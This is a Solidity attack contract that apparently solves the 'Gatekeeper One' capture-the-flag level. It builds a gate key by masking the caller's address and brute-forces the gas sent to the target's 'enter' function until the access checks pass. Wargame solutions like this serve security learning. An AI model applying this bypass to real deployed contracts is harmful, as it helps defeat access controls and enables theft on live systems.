// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperEnter {
    event Response(bool success, bytes data, uint256 gas);


    function loop(address gatekeeper, uint256 counter) public {
        bytes8 key = bytes8(uint64(uint160(msg.sender) & 0xFFFFFFFF0000FFFF));
        uint256 gas = 8191 + counter + 23000;
        for(uint256 i = gas; i > (8191 + counter); i--) {
            if(crack(gatekeeper, key, i) == true) {
                return;
            }
        }
    }

    function crack(address gatekeeper, bytes8 key, uint gas_value) internal returns(bool){

        (bool success, bytes memory data) = gatekeeper.call{gas: gas_value}(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        if(success) {
            emit Response(success, data, gas_value);
        }
        return success;
    }
}